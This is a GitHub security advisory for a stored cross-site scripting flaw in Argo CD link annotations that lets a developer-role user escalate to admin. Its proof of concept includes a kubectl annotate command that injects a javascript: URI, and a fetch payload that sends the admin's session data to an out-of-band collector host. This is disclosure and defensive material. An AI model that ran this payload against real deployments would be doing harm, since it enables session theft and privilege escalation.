# [H] Argo CD: Stored XSS in application link annotations enables developer-to-admin privilege escalation

## Summary
Severity: High
Advisory: GHSA-h98r-wv3h-fr38
CVE: CVE-2026-45738
CWE: CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-h98r-wv3h-fr38
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-cd/v3` — affected >=0 <3.2.12
- Go: `github.com/argoproj/argo-cd/v3` — affected >=3.3.0-rc1 <3.3.10
- Go: `github.com/argoproj/argo-cd/v3` — affected >=3.4.0-rc1 <3.4.2
- Go: `github.com/argoproj/argo-cd/v2` — affected >=0
- Go: `github.com/argoproj/argo-cd` — affected >=0

## Details
### Summary

A user with **application write access (developer role)** can set `link.argocd.argoproj.io/*` annotations on any ArgoCD Application. These annotation values are rendered in the Summary tab's **URLs section** as `<a href>` elements without URL validation. Using the pipe-separator trick (`Display Text | javascript:...`), an attacker can inject a `javascript:` URI while displaying a legitimate-looking label (e.g. `GitHub Repo`). When a higher-privileged user (admin) clicks the link, **arbitrary JavaScript executes in the ArgoCD origin context** in the admin's authenticated session context, enabling API exfiltration and privilege escalation from developer to admin.

### Details

**Vulnerable sink:** `ui/src/app/applications/components/application-summary/application-summary.tsx:277`

```tsx
const parts = (url || '').split('|');
<a key={i} href={parts.length > 1 ? parts[1] : parts[0]} target='_blank'>
    {parts[0]}
</a>
```

The annotation value is split on `|`. `parts[0]` becomes the visible link label; `parts[1]` becomes the `href`. **No call to `isValidURL()` is made**, unlike the protected `ApplicationURLs` component (`application-urls.tsx:72,80`) which does validate URLs and blocks `javascript:`. The `target='_blank'` opens a new tab that inherits the ArgoCD origin, giving the injected script same-origin fetch access to all ArgoCD APIs using the victim's authenticated session (credentialed `fetch()` calls).

**Root cause:** React 16.x does not block `javascript:` URIs in `href` attributes (this protection was added in React 19). The helper `isValidURL()` exists in `shared/utils.ts` but is **not applied** to this sink.

**CSP:** ArgoCD's default Content Security Policy is `frame-ancestors 'self'` only — no `script-src`, no `connect-src`, no `default-src` — providing **zero XSS execution mitigation**.

### PoC

**Prerequisites:** Developer role with application write access (e.g. RBAC: `p, role:developer, applications, *, */*, allow`).

**Step 1 — Set malicious annotation as developer:**

```bash
kubectl annotate application <app-name> -n argocd \
  'link.argocd.argoproj.io/docs=GitHub Repo|javascript:fetch("https://<argocd-host>/api/v1/session/userinfo",{credentials:"include"}).then(r=>r.json()).then(d=>fetch("https://xxx.oastify.com/?d="+btoa(JSON.stringify(d)),{mode:"no-cors"}))'
```

The URL section in the admin's Summary tab renders the link as **"GitHub Repo"** — the `javascript:` payload is invisible in the displayed text.

**Step 2 — Admin opens Summary tab** of the annotated application and clicks the link.

**Step 3 — JavaScript executes** at the ArgoCD origin and exfiltrates admin session data via out-of-band HTTP request. Tested with Burp Collaborator:

```javascript
// Payload used during testing (Burp Collaborator OOB):
fetch("https://<argocd-host>/api/v1/session/userinfo", {credentials:"include"})
  .then(r => r.json())
  .then(d => fetch("https://xxx.oastify.com/?d=" + btoa(JSON.stringify(d)), {mode:"no-cors"}))
```

**Step 4 — Burp Collaborator received the OOB HTTP interaction** containing the base64-encoded admin session data. Decoded response:

```json
{"iss":"argocd","loggedIn":true,"username":"admin"}
```

**Tested on:** ArgoCD v3.3.8 (commit 0850e97), React 16.9.3.

### Impact

- **Stored XSS** — payload persists in the Kubernetes Application resource until manually removed
- **Privilege escalation** — developer role → admin session hijacking via authenticated API calls
- **Maximum stealth** — the injected link displays as any attacker-chosen text; the `javascript:` href is never visible to the victim
- **No server-side interaction required** — purely client-side exploit, no network egress needed for execution (exfiltration uses `no-cors` fetch, bypassed by absent `connect-src` CSP)
- Any admin or operator who views the Summary tab of the compromised application is affected

### Credits

Discovered and reported by **Jan Kahmen** ([jan@turingpoint.de](mailto:jan@turingpoint.de)) — [turingpoint.de](https://turingpoint.de)

## References
- https://github.com/argoproj/argo-cd/security/advisories/GHSA-h98r-wv3h-fr38
- https://github.com/argoproj/argo-cd
